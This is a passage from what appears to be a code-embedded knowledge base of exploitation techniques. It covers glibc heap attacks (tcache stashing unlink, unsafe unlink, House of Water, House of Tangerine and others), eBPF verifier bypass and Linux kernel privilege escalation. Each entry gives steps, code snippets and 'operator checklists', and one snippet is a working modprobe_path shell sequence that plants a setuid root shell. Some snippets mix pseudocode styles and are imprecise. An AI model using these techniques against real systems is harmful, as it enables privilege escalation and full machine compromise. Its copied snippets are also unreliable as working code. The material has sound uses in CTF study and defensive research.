free(a)  # a → unsorted bin
free(b)  # b → unsorted bin, consolidates with a? Use a guard chunk
# ... (after consolidation prevention)

# Corrupt last smallbin chunk's bk:
# smallbin_tail->bk = target - 0x10
*(uint64_t*)(smallbin_tail + 0x18) = target_addr - 0x10

# Trigger: calloc(0x100) → stashing unlink → arbitrary write at target_addr
c = calloc(1, 0x100)  # boom!`,
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'Tcache Stashing Unlink Attack', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack' },
          { description: 'How2Heap: tcache_stashing_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.30/tcache_stashing_unlink_attack.c' }
        ]
      },
      {
        name: 'Stashing Unlink → _IO_list_all Overwrite → FSOP',
        description: 'Use the arbitrary write from stashing unlink to corrupt _IO_list_all (a pointer in libc that chains all open FILE streams), achieving FSOP.',
        steps: [
          'The stashing unlink writes main_arena+0x60-ish (varies by glibc) to target_addr - 0x10 + 0x10 = target_addr',
          'Choose target_addr = &_IO_list_all - 0x10, so that _IO_list_all now points into main_arena (a heap pointer)',
          'Forge a fake _IO_FILE structure on the heap at that address, with a valid vtable (for glibc < 2.24) or a forged wide_data (for glibc 2.24+)',
          'Trigger exit() or return from main → _IO_flush_all_lockp walks _IO_list_all → calls our fake vtable function'
        ],
        tools: ['pwndbg', 'pwntools'],
        applicableLibc: '2.26-2.31',
        references: [
          { description: 'Stashing Unlink + FSOP chain' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'Arbitrary address overwritten with a libc/heap pointer (main_arena+X)',
        '_IO_list_all or other globals corrupted to enable second-stage exploitation',
        'Code execution achieved via FSOP or similar post-write technique'
      ],
      artifacts: [
        'GDB: corruption of _IO_list_all pointer visible after calloc',
        'Smallbin with corrupted bk chain'
      ]
    },

    operatorChecklist: [
      '[ ] Verify calloc() is used in the binary (not just malloc)',
      '[ ] Determine glibc version (must be 2.26-2.31 for stashing)',
      '[ ] Set up heap: free chunks into smallbin, leave tcache with 1-4 slots remaining',
      '[ ] Identify smallbin layout via "pwndbg bins"',
      '[ ] Corrupt the bk pointer of a smallbin chunk via UAF or heap overflow',
      '[ ] Choose target: _IO_list_all, __free_hook, or any writable global',
      '[ ] Trigger calloc() to invoke the stash and unlink',
      '[ ] Verify the write occurred via GDB inspection',
      '[ ] Chain with FSOP or other second-stage technique for code execution'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'calloc'],
    references: [
      { description: 'Tcache Stashing Unlink Attack on CTF Wiki', url: 'https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/tcache_attack/#tcache-stashing-unlink-attack' },
      { description: 'How2Heap tcache_stashing_unlink_attack.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.30/tcache_stashing_unlink_attack.c' }
    ]
  },

  ebpf_exploit_detailed: {
    id: 'ebpf_exploit_detailed',
    name: 'eBPF Verifier Bypass Exploitation',
    category: 'technique',
    class: 'ebpf',
    description: 'Exploits flaws in the Linux kernel\'s eBPF verifier — a static analyzer that "proves" eBPF programs are safe before loading them. By finding verifier bugs (incorrect bounds tracking, type confusion, or speculative execution issues), attackers load malicious BPF programs that can read/write arbitrary kernel memory.',

    preconditions: {
      summary: 'A bug in the eBPF verifier allows loading a BPF program that accesses memory beyond the verifier-approved bounds.',
      required: [
        'CAP_BPF or CAP_SYS_ADMIN capability, OR unprivileged BPF is enabled (kernel.unprivileged_bpf_disabled=0)',
        'A vulnerable kernel version with a known verifier bypass (CVE)',
        'Knowledge of kernel data structures (task_struct, cred, modprobe_path, etc.)',
        'Ability to interact with the BPF syscall (bpf(BPF_PROG_LOAD, ...))'
      ],
      detectionSteps: [
        'Check kernel version: uname -r → map to known CVEs',
        'Check BPF access: cat /proc/sys/kernel/unprivileged_bpf_disabled (0 = enabled)',
        'Check if you have CAP_BPF: capsh --print | grep cap_bpf',
        'Run existing eBPF exploit PoCs against the kernel to test vulnerability'
      ]
    },

    exploitationPaths: [
      {
        name: 'Verifier Bounds Check Bypass → Arbitrary Kernel Read',
        description: 'Trick the verifier into believing a BPF register\'s value is within safe bounds when it can actually hold an out-of-bounds value at runtime.',
        steps: [
          'Identify a verifier bug where register min/max bounds (umax_value/smin_value) are not properly updated after certain ALU operations',
          'Craft BPF bytecode: use BPF_JMP32 with signed comparisons to create a register the verifier thinks is bounded to [0,N) but can actually hold > N',
          'Use the OOB register as an index into a BPF map value → read kernel memory past the map allocation',
          'Leak kernel text/data pointers via the OOB read to bypass KASLR'
        ],
        tools: ['bpf_asm (BPF assembler)', 'custom eBPF bytecode generator', 'pwntools'],
        codeSnippet: `// Pseudocode for verifier bounds bypass:
// Trick: make verifier think r1 is in range [0, 100], but r1 can be 0xFFFF
BPF_MOV64_REG(BPF_REG_2, BPF_REG_1)
BPF_JMP_IMM(BPF_JGT, BPF_REG_2, 100, +1) // if r2 > 100, jump
BPF_EXIT()                                  // safe path: exit
// Attacker sends r1 = 0xFFFFFFFF (signed -1)
// Verifier: r1=smin=-1,smax=-1 on this path (BUG: smax not updated after signed compare)
// But actual runtime: r1 = 0xFFFFFFFF → used as index → OOB!`,
        references: [
          { description: 'CVE-2020-8835: eBPF verifier bounds tracking bug', url: 'https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification' },
          { description: 'eBPF Verifier Exploitation Techniques', url: 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' }
        ]
      },
      {
        name: 'BPF Helper Function Abuse → Kernel Arbitrary Write',
        description: 'Use BPF helper functions like bpf_map_update_elem with corrupted pointers from a verifier bypass to write to arbitrary kernel memory.',
        steps: [
          'Leak kernel base via OOB read (step 1 above)',
          'Identify target: modprobe_path (easiest), core_pattern, or current->cred->uid',
          'Use bpf_map_update_elem() with a map pointer that overlaps the target kernel address',
          'Write shell command path to modprobe_path → trigger execution of unknown binary → shell as root'
        ],
        tools: ['custom BPF exploit', 'pwntools'],
        codeSnippet: `// Overwrite modprobe_path via BPF write primitive:
uint64_t modprobe_path_addr = kernel_base + MODPROBE_PATH_OFFSET;
// Forge a BPF map pointer pointing to modprobe_path
// Call bpf_map_update_elem(forge_map, &key, new_value, flags)
// new_value = "/tmp/x.sh\\x00" → modprobe_path now points to our script`,
        references: [
          { description: 'modprobe_path overwrite technique', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
        ]
      },
      {
        name: 'Speculative Execution / Spectre-BPF',
        description: 'Use speculative execution in the BPF JIT to leak data that the verifier marked as inaccessible.',
        steps: [
          'This class of attack relies on CPU speculative execution, not logic bugs',
          'Requires BPF JIT enabled (check: /proc/sys/net/core/bpf_jit_enable)',
          'Very complex to exploit — typically requires deep kernel and CPU microarchitecture knowledge'
        ],
        tools: ['custom spectre gadgets', 'kernel exploit framworks'],
        references: [
          { description: 'Spectre v1/v2 via BPF', url: 'https://ebpf.io/static/2018-spectre-summit-krsti.pdf' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'BPF program loaded despite accessing OOB memory',
        'Kernel memory leaked (KASLR bypass achieved)',
        'modprobe_path overwritten with attacker-controlled path',
        'Root shell obtained via kernel write → userspace privilege escalation'
      ],
      artifacts: [
        'Loaded BPF program visible via bpftool prog show',
        'Modified modprobe_path = "/tmp/x" in kernel memory'
      ]
    },

    operatorChecklist: [
      '[ ] Check kernel version and cross-reference with known eBPF CVEs',
      '[ ] Check bpf_unprivileged setting: can you load BPF programs?',
      '[ ] If privileged: look for verifier bugs in newer kernels',
      '[ ] Study the vulnerable verifier code path in kernel source',
      '[ ] Craft BPF bytecode (use bpf_asm or write raw instructions)',
      '[ ] Test BPF program loading: verify verifier accepts the malicious program',
      '[ ] Implement OOB read to leak kernel pointers (KASLR bypass)',
      '[ ] Implement OOB write to overwrite modprobe_path or cred struct',
      '[ ] Trigger the overwritten path: execute unknown-binary-file → shell'
    ],

    vulnerabilityTypes: ['sandbox', 'kernel', 'ebpf'],
    references: [
      { description: 'ZB eBPF Verifier Bug Writeup (CVE-2020-8835)', url: 'https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification' },
      { description: 'Kernel Pwning with eBPF', url: 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' },
      { description: 'Linux Kernel Exploitation - eBPF', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
    ]
  },

  kernel_privilege_escalation: {
    id: 'kernel_privilege_escalation',
    name: 'Kernel Privilege Escalation',
    category: 'technique',
    class: 'kernel',
    description: 'Exploits a vulnerability in the Linux kernel to elevate privileges from an unprivileged user to root. Common targets include heap overflows in kernel structures (SLUB allocator), race conditions, and logic bugs in syscall handlers.',

    preconditions: {
      summary: 'A kernel vulnerability (CVE) exists on the target system that allows memory corruption or logic bypass in kernel space.',
      required: [
        'Identified kernel vulnerability with a known exploitation technique',
        'Ability to interact with the vulnerable kernel interface (syscalls, ioctls, netlink, procfs, etc.)',
        'KASLR bypass technique (unless kernel addresses are somehow known)',
        'SMEP/SMAP bypass technique (unless disabled — check /proc/cpuinfo for smep/smap)',
        'Ability to run user-space code on the target machine'
      ],
      detectionSteps: [
        'uname -r → note kernel version → cross-reference with exploit-db, CVE databases',
        'cat /proc/cpuinfo | grep -E "smep|smap" → protection status',
        'cat /proc/sys/kernel/kptr_restrict → 0 = kernel pointers visible, 1/2 = hidden',
        'cat /proc/sys/kernel/dmesg_restrict → 0 = dmesg accessible',
        'Run linux-exploit-suggester or similar enumeration tools'
      ]
    },

    exploitationPaths: [
      {
        name: 'cred Structure Overwrite',
        description: 'The most direct path: overwrite the cred structure (specifically uid/gid fields) in the current task_struct to become root.',
        steps: [
          'Obtain the address of your current task_struct (via kernel stack leak, kallsyms, or /proc/self/stat)',
          'Use a kernel R/W primitive (arbitrary write via heap overflow, UAF, etc.) to overwrite cred->uid, cred->gid, cred->euid, cred->egid to 0',
          'Call setuid(0) or simply execve("/bin/sh") → shell spawns with root privileges'
        ],
        tools: ['kernel exploit (C)', 'pwntools (userspace orchestration)'],
        codeSnippet: `// Kernel exploit: commit_creds(prepare_kernel_cred(0))
void get_root(void) {
    commit_creds(prepare_kernel_cred(0));
}

// Or: manually zero out cred struct fields
// task_struct->cred->uid = 0;
// task_struct->cred->gid = 0;`
      },
      {
        name: 'modprobe_path Overwrite → Userspace Shell',
        description: 'Overwrite the kernel\'s modprobe_path string to point to an attacker-controlled script that will be executed as root.',
        steps: [
          'Use arbitrary kernel write to overwrite modprobe_path (located in kernel data section) with "/tmp/x" (a path you control)',
          'Create /tmp/x: a shell script that copies /bin/sh to /tmp/shell and chmod +s it (or starts a reverse shell)',
          'chmod +x /tmp/x',
          'Trigger modprobe by executing a file with an unknown binary format (e.g., a file with magic bytes \\xff\\xff\\xff\\xff)',
          'Kernel calls /tmp/x as root → /tmp/x runs → root shell planted'
        ],
        tools: ['kernel exploit (C)', 'pwntools'],
        codeSnippet: `// User-space part after modprobe_path overwrite:
echo '#!/bin/sh
cp /bin/sh /tmp/sh && chmod 4777 /tmp/sh' > /tmp/x
chmod +x /tmp/x
echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy  # triggers modprobe_path = "/tmp/x" as root
/tmp/sh     # root shell!`,
        references: [
          { description: 'modprobe_path technique', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
        ]
      },
      {
        name: 'ret2usr (SMEP Disabled)',
        description: 'Redirect kernel execution to a user-space function that calls commit_creds(prepare_kernel_cred(0)).',
        steps: [
          'Overwrite a kernel function pointer with the address of a user-space shellcode function',
          'User-space function: call commit_creds(prepare_kernel_cred(0)) → return to user space → execve("/bin/sh")',
          'SMEP must be disabled (or bypassed via ROP to flip CR4.SMEP bit first)',
          'In newer kernels, SMEP is almost always on → requires a ROP chain to disable first if no SMAP bypass'
        ],
        tools: ['kernel exploit (C)', 'pwntools'],
        references: [
          { description: 'ret2usr technique', url: 'https://ctf101.org/kernel-exploitation/ret2usr/' }
        ]
      },
      {
        name: 'Kernel ROP Chain (SMEP/SMAP Enabled)',
        description: 'Build a kernel-space ROP chain using found gadgets to call commit_creds(prepare_kernel_cred(0)).',
        steps: [
          'Leak kernel base address via /proc/kallsyms (if readable) or kernel info leak',
          'Find kernel gadgets with ROPgadget on the kernel image (vmlinux)',
          'Build ROP chain: pop rdi; ret → prepare_kernel_cred_addr → pop rdi; ret → commit_creds_addr → return_to_user',
          'Stack pivot to a controlled kernel region (modprobe_path overwrite or heap spray)',
          'Trigger kernel vulnerability to execute the ROP chain'
        ],
        tools: ['ROPgadget (on vmlinux)', 'pwntools'],
        references: [
          { description: 'Kernel ROP exploitation', url: 'https://ctf101.org/kernel-exploitation/kernel-rop/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'uid=0 in /bin/sh (or effective root privileges)',
        'commit_creds(prepare_kernel_cred(0)) executed in kernel context',
        'modprobe_path overwritten, suid binary planted'
      ],
      artifacts: [
        'dmesg showing kernel crash/cleanup if the exploit is unstable',
        'Root shell session',
        'Planted /tmp/sh with suid bit set'
      ]
    },

    operatorChecklist: [
      '[ ] Enumerate kernel version: uname -r → find applicable CVEs',
      '[ ] Check SMEP/SMAP/KPTI/KASLR status from /proc/cpuinfo and kernel config',
      '[ ] Check kptr_restrict for kernel address leak viability',
      '[ ] Find a kernel info leak (if KASLR enabled) — often via /proc/kallsyms, dmesg, or /sys interfaces',
      '[ ] Identify write primitive target: cred struct, modprobe_path, or function pointer',
      '[ ] If SMEP on: must use kernel ROP (cannot ret2usr directly)',
      '[ ] Build kernel ROP chain or prepare user-space shellcode function',
      '[ ] Develop the trigger for the kernel vulnerability (syscall, ioctl, race)',
      '[ ] Test locally in QEMU with matching kernel version before targeting remote'
    ],

    vulnerabilityTypes: ['sandbox', 'kernel'],
    references: [
      { description: 'Linux Kernel Exploitation (LKMPG)', url: 'https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/' },
      { description: 'Kernel PWN CTF 101', url: 'https://ctf101.org/kernel-exploitation/overview/' },
      { description: 'Kernel Exploitation Techniques', url: 'https://github.com/xairy/kernel-exploits' }
    ]
  },

  unsafe_unlink: {
    id: 'unsafe_unlink',
    name: 'Unsafe Unlink',
    category: 'technique',
    class: 'unlink',
    description: 'Exploits free() on a corrupted chunk in the unsorted bin to achieve arbitrary write. By forging fd and bk pointers of a freed chunk, the allocator unlink operation writes a heap pointer to an arbitrary memory location.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the fd/bk pointers of a chunk that will be placed in the unsorted bin.',
      required: [
        'Heap overflow or UAF on a chunk >= 0x80 bytes (unsorted bin range)',
        'Ability to corrupt fd and bk pointers of the freed chunk',
        'Target address must be writable (the unlink write: bk->fd = fd)',
        'The corrupted chunk must be freed and end up in the unsorted bin'
      ],
      detectionSteps: [
        'In GDB: set breakpoint on free and inspect chunk being freed',
        'Use pwndbg bins command to verify chunk enters unsorted bin',
        'Corrupt fd = target_addr - 0x18, bk = target_addr - 0x10',
        'Trigger free to see corrupted double-linked list error indicates successful unlink attempt'
      ]
    },

    exploitationPaths: [
      {
        name: 'Arbitrary Write via Unsorted Bin Unlink',
        description: 'Forge fd/bk of a freed chunk so that the allocator unlink writes a heap pointer to an arbitrary address.',
        steps: [
          'Allocate chunk A (>= 0x80 bytes) and chunk B (guard chunk)',
          'Overflow chunk A to corrupt the fd/bk pointers of chunk B (or forge them in A if A is freed)',
          'Set fd = target_addr - 0x18, bk = target_addr - 0x10',
          'Free chunk B which enters unsorted bin',
          'Trigger consolidation or next malloc: unlink runs chunk->bk->fd = chunk->fd',
          'Result: target_addr receives a heap pointer (the fd value)',
          'This is a write-what-where where what is a heap address'
        ],
        tools: ['pwndbg bins', 'pwntools', 'GDB'],
        codeSnippet: `# Forge chunk fd/bk for unlink
# target: arbitrary writable address
fd = target_addr - 0x18
bk = target_addr - 0x10

# Write forged pointers into the chunk
*(uint64_t*)(chunk + 0x10) = fd  # fd field
*(uint64_t*)(chunk + 0x18) = bk  # bk field

# Free the chunk enters unsorted bin
free(chunk)

# Trigger unlink: malloc or consolidation
malloc(0x50)
# Now: *(target_addr) = heap_pointer (fd value)`,
        applicableLibc: 'All versions (classic technique)',
        references: [
          { description: 'How2Heap: unsafe_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c' },
          { description: 'HITCON 2014 stkof writeup', url: 'http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with a heap pointer', 'Can be chained with GOT overwrite or hook corruption'],
      artifacts: ['GDB: corrupted chunk fd/bk visible in unsorted bin']
    },

    operatorChecklist: [
      '[ ] Identify heap overflow or UAF on unsorted-bin-sized chunk',
      '[ ] Find a writable target address (GOT entry, global variable, etc.)',
      '[ ] Forge fd = target - 0x18, bk = target - 0x10 in the chunk',
      '[ ] Free the chunk into unsorted bin',
      '[ ] Trigger unlink via malloc or consolidation',
      '[ ] Verify target address now contains a heap pointer',
      '[ ] Chain with second-stage technique (GOT overwrite, FSOP, etc.)'
    ],

    vulnerabilityTypes: ['heap', 'unlink'],
    references: [
      { description: 'How2Heap: unsafe_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c' },
      { description: 'HITCON 2014: stkof', url: 'http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/' },
      { description: 'Insomnihack 2017: Wheel of Robots', url: 'https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a' }
    ]
  },

  overlapping_chunks: {
    id: 'overlapping_chunks',
    name: 'Overlapping Chunks',
    category: 'technique',
    class: 'heap-technique',
    description: 'Corrupts the size field of a freed or in-use chunk to cause a subsequent allocation to overlap with an existing chunk. Creates an overlapping allocation primitive that enables arbitrary read/write through two pointers to the same memory.',

    preconditions: {
      summary: 'A heap overflow that can overwrite the size field of an adjacent chunk (freed or in-use), causing the allocator to return overlapping memory.',
      required: [
        'Heap overflow reaching the next chunk size field',
        'Ability to set the size to a value that includes both chunks',
        'The corrupted chunk must be freed (for freed chunk variant) or the overflow must reach an in-use chunk size (for in-use variant)',
        'Glibc < 2.29 for the classic technique (patched in 2.29+ with additional size checks)'
      ],
      detectionSteps: [
        'In GDB: use vis_heap_chunks to visualize chunk layout',
        'Overflow into next chunk size field and set it to a large value',
        'Free the chunk and observe it enters unsorted bin with corrupted size',
        'Next malloc returns a chunk that overlaps with the following allocation'
      ]
    },

    exploitationPaths: [
      {
        name: 'Freed Chunk Size Corruption to Overlapping Allocation',
        description: 'Overwrite the size of a freed chunk in the unsorted bin to make the next allocation overlap with an existing chunk.',
        steps: [
          'Allocate chunks A, B, C (C is a guard chunk)',
          'Free B which enters unsorted bin',
          'Overflow A to corrupt B size field and set it to include C space',
          'Allocate a new chunk of the corrupted size which returns B+C combined',
          'Now the new allocation overlaps with C giving two pointers to overlapping memory',
          'Use the overlap to read/write controlled data through one pointer while the other pointer operates on it'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `a = malloc(0x80)
b = malloc(0x80)
c = malloc(0x80)  # guard chunk

free(b)  # b goes to unsorted bin

# Overflow a into b size field
*(uint64_t*)(a + 0x80) = 0x110  # b size now includes c

# Allocate overlapping chunk
d = malloc(0x100)  # d overlaps with c!
# Now d and c point to overlapping memory`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c' }
        ]
      },
      {
        name: 'In-Use Chunk Size Corruption to Overlapping Allocation',
        description: 'Overwrite the size of an in-use chunk to cause the next allocation to overlap.',
        steps: [
          'Allocate chunks A, B (B is in-use)',
          'Overflow A to corrupt B size field and set to a large value',
          'Free B and allocator uses the corrupted size for bin placement',
          'Next malloc returns a chunk overlapping with the following allocation'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: overlapping_chunks_2', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Two heap pointers reference overlapping memory regions', 'Arbitrary read/write achieved through the overlap'],
      artifacts: ['GDB: vis_heap_chunks shows overlapping chunk boundaries']
    },

    operatorChecklist: [
      '[ ] Identify heap overflow reaching next chunk size field',
      '[ ] Determine glibc version (< 2.29 for classic technique)',
      '[ ] Set up chunks: target chunk + guard chunk',
      '[ ] Corrupt size field to include the guard chunk',
      '[ ] Free the corrupted chunk',
      '[ ] Allocate to get overlapping region',
      '[ ] Use overlap for arbitrary read/write or metadata corruption'
    ],

    vulnerabilityTypes: ['heap', 'overflow'],
    references: [
      { description: 'How2Heap: overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c' },
      { description: 'How2Heap: overlapping_chunks_2', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c' },
      { description: 'hack.lu CTF 2015: bookstore', url: 'https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore' }
    ]
  },

  unsorted_bin_into_stack: {
    id: 'unsorted_bin_into_stack',
    name: 'Unsorted Bin into Stack',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an overwrite of a freed chunk bk pointer in the unsorted bin to make malloc return a nearly-arbitrary pointer. By corrupting the unsorted bin linked list, the allocator returns a pointer to an attacker-controlled address (typically on the stack).',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the bk pointer of a chunk in the unsorted bin.',
      required: [
        'Heap overflow or UAF on a chunk that will be freed into the unsorted bin',
        'Ability to corrupt the bk pointer of the freed chunk',
        'Target address must have a valid fd pointer at offset 0 (for the forward check)',
        'Glibc < 2.29 (patched with additional integrity checks)'
      ],
      detectionSteps: [
        'Free a chunk and verify it enters the unsorted bin via pwndbg bins',
        'Corrupt the bk pointer of the unsorted bin chunk to point to target - 0x10',
        'Ensure target address has a valid fd pointer (for the unlink check: fd->bk == chunk)',
        'Trigger malloc: allocator follows corrupted bk and returns pointer near target'
      ]
    },

    exploitationPaths: [
      {
        name: 'Unsorted Bin bk Corruption to Arbitrary Allocation',
        description: 'Corrupt the bk pointer of an unsorted bin chunk to redirect the allocator allocation to a target address.',
        steps: [
          'Allocate chunk A (>= 0x80 bytes) and free it which enters unsorted bin',
          'Overflow into A bk pointer (at offset 0x18 from chunk start)',
          'Set bk = target_addr - 0x10 (where target is where you want malloc to return)',
          'Ensure target_addr - 0x10 has a valid fd pointer pointing back to the unsorted bin head (for the integrity check)',
          'Call malloc(size): allocator traverses unsorted bin, follows corrupted bk, returns chunk at target_addr',
          'Now you have an allocation at an arbitrary address'
        ],
        tools: ['pwndbg bins', 'pwntools', 'GDB'],
        codeSnippet: `# Free chunk into unsorted bin
a = malloc(0x80)
free(a)  # a goes to unsorted bin

# Corrupt bk pointer
# bk is at offset 0x18 from chunk start
*(uint64_t*)(a + 0x18) = target_addr - 0x10

# Ensure target has valid fd for integrity check
*(uint64_t*)(target_addr - 0x10) = &unsorted_bin_head

# Trigger allocation
b = malloc(0x80)  # b points to target_addr!`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: unsorted_bin_into_stack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_into_stack.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns pointer at attacker-controlled address', 'Arbitrary allocation primitive achieved'],
      artifacts: ['GDB: unsorted bin with corrupted bk chain']
    },

    operatorChecklist: [
      '[ ] Free chunk into unsorted bin',
      '[ ] Corrupt bk pointer via heap overflow or UAF',
      '[ ] Set bk = target - 0x10',
      '[ ] Ensure target has valid fd pointer for integrity check',
      '[ ] Trigger malloc to get allocation at target',
      '[ ] Note: patched in glibc 2.29+'
    ],

    vulnerabilityTypes: ['heap', 'unsorted-bin'],
    references: [
      { description: 'How2Heap: unsorted_bin_into_stack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_into_stack.c' }
    ]
  },

  house_of_water: {
    id: 'house_of_water',
    name: 'House of Water',
    category: 'technique',
    class: 'house',
    description: 'A leakless heap exploitation technique that uses a UAF or double-free to gain control of the tcache metadata structure. By manipulating the tcache_perthread_struct, an attacker can link arbitrary addresses into the tcache without any libc or heap leaks.',

    preconditions: {
      summary: 'A UAF or double-free vulnerability on a tcache chunk that allows overwriting the tcache metadata structure.',
      required: [
        'UAF or double-free on a tcache-sized chunk',
        'Ability to write to the tcache_perthread_struct (located in the heap)',
        'No leaks required: this is a fully leakless technique',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Identify tcache_perthread_struct location: heap_base + 0x10 (after main arena)',
        'The struct contains: counts[64] (bytes) + entries[64] (pointers)',
        'Use UAF to overwrite entries[N] with target address',
        'Set counts[N] > 0 to mark the bin as having entries'
      ]
    },

    exploitationPaths: [
      {
        name: 'Leakless Tcache Metadata Control to Arbitrary Allocation',
        description: 'Corrupt the tcache metadata to insert arbitrary addresses into the tcache without any leaks.',
        steps: [
          'Find the tcache_perthread_struct on the heap (typically at heap_base + 0x10)',
          'Use UAF or double-free to overwrite an entry in the tcache entries array',
          'Set entries[size_index] = target_address (the address you want malloc to return)',
          'Set counts[size_index] = 1 (mark the bin as non-empty)',
          'Call malloc(size): returns target_address directly from the corrupted tcache',
          'No leaks needed: the tcache metadata is at a predictable offset from the heap base'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Find tcache_perthread_struct
# Located at heap_base + 0x10
# Structure: counts[64] (64 bytes) + entries[64] (512 bytes)

# Overwrite tcache metadata via UAF
tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4  # index for 0x60 size

# Set entries[size_index] = target
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr

# Set counts[size_index] = 1
*(uint8_t*)(tcache_struct + size_index) = 1

# malloc returns target_addr
p = malloc(0x60)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: house_of_water', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c' },
          { description: '37C3 Potluck CTF: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns attacker-controlled address without any leaks', 'Arbitrary allocation achieved leaklessly'],
      artifacts: ['Corrupted tcache_perthread_struct on the heap']
    },

    operatorChecklist: [
      '[ ] Identify UAF or double-free on tcache chunk',
      '[ ] Locate tcache_perthread_struct (heap_base + 0x10)',
      '[ ] Calculate size_index = target_size >> 4',
      '[ ] Overwrite entries[size_index] = target_address',
      '[ ] Set counts[size_index] = 1',
      '[ ] malloc(target_size) returns target_address',
      '[ ] Chain with second-stage technique for code execution'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'uaf'],
    references: [
      { description: 'How2Heap: house_of_water', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c' },
      { description: '37C3 Potluck: Tamagoyaki writeup', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
    ]
  },

  house_of_tangerine: {
    id: 'house_of_tangerine',
    name: 'House of Tangerine',
    category: 'technique',
    class: 'house',
    description: 'A modern (glibc >= 2.26) technique that exploits the top chunk (wilderness) to trick malloc into returning a completely arbitrary pointer by abusing the tcache freelist. It combines top chunk corruption with tcache poisoning to achieve arbitrary allocation without the limitations of House of Orange.',

    preconditions: {
      summary: 'An overflow into the top chunk size field combined with the ability to trigger sysmalloc and tcache operations.',
      required: [
        'Heap overflow reaching the top chunk size field',
        'Ability to trigger a large malloc that invokes sysmalloc',
        'Glibc >= 2.26 (tcache era)',
        'No free() call strictly required (similar to House of Orange but uses tcache)'
      ],
      detectionSteps: [
        'Overflow into top chunk size and set to a value that triggers sysmalloc',
        'Trigger large malloc: sysmalloc frees old top chunk',
        'The freed top chunk enters the tcache (if size <= 0x408)',
        'Corrupt the tcache entry to point to arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Top Chunk + Tcache to Arbitrary Pointer',
        description: 'Corrupt top chunk to trigger sysmalloc, then abuse tcache to get arbitrary allocation.',
        steps: [
          'Overflow into top chunk size field and set to a small value that triggers sysmalloc',
          'Call malloc(large_size): sysmalloc is invoked',
          'sysmalloc frees the old top chunk: it enters the tcache (if size is in tcache range)',
          'Use UAF or overflow to corrupt the tcache fd pointer of the freed top chunk',
          'Set fd = target_address',
          'malloc(same_size) returns target_address from the corrupted tcache'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into top chunk
# Set top chunk size to trigger sysmalloc
*(uint64_t*)(top_chunk + 0x8) = 0x21  # small size

# Trigger sysmalloc
malloc(0x1000)  # old top chunk freed, enters tcache

# Corrupt tcache fd pointer
# The freed top chunk is now in tcache
*(uint64_t*)(freed_top_chunk) = target_addr

# Get arbitrary allocation
p = malloc(0x10)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: house_of_tangerine', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c' },
